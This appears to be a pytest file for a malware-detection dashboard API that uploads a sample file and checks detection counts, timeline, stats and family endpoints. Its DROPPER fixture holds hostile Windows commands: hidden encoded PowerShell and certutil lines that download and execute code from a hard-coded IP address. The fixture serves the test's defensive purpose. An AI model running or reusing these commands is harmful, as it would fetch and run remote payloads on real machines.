"""Threat-tracking dashboard endpoints (Milestone 2 - dashboard role)."""

import io

from fastapi.testclient import TestClient

from app.main import app

client = TestClient(app)

DROPPER = (
    b"powershell -nop -w hidden -enc AAAA; "
    b"IEX (New-Object Net.WebClient).DownloadString('http://45.147.230.112/a.ps1'); "
    b"cmd.exe /c certutil -urlcache -f http://45.147.230.112/b b"
)
CLEAN = b"hello, this is a plain and boring text file " * 20


def _headers(email="analyst@local"):
    tok = client.post("/api/v1/auth/login", json={"email": email, "password": "x"}).json()[
        "access_token"
    ]
    return {"Authorization": f"Bearer {tok}"}


def test_threat_timeline_stats_match_detections():
    soc = _headers("soc@local")
    before = client.get("/api/v1/threats/detections", headers=soc).json()
    n_before = len(before)

    client.post(
        "/api/v1/files/upload",
        files={"file": ("dash-drop.bin", io.BytesIO(DROPPER), "application/octet-stream")},
        headers=_headers(),
    )
    client.post(
        "/api/v1/files/upload",
        files={"file": ("dash-clean.txt", io.BytesIO(CLEAN), "text/plain")},
        headers=_headers(),
    )

    dets = client.get("/api/v1/threats/detections", headers=soc)
    assert dets.status_code == 200
    assert len(dets.json()) == n_before + 2

    # filters are additive, must not break the base query
    filt = client.get(
        "/api/v1/threats/detections",
        params={"limit": 5, "q": "dash-"},
        headers=soc,
    )
    assert filt.status_code == 200
    assert len(filt.json()) >= 2

    timeline = client.get("/api/v1/threats/timeline", params={"window": "24h"}, headers=soc)
    assert timeline.status_code == 200
    assert len(timeline.json()) == 24
    assert sum(b["total"] for b in timeline.json()) >= 2

    stats = client.get("/api/v1/threats/stats", headers=soc)
    assert stats.status_code == 200
    body = stats.json()
    assert body["total_detections"] == len(dets.json())
    assert body["malicious"] + body["suspicious"] + body["benign"] == body["total_detections"]

    fams = client.get("/api/v1/threats/families", headers=soc)
    assert fams.status_code == 200
    assert isinstance(fams.json(), list)
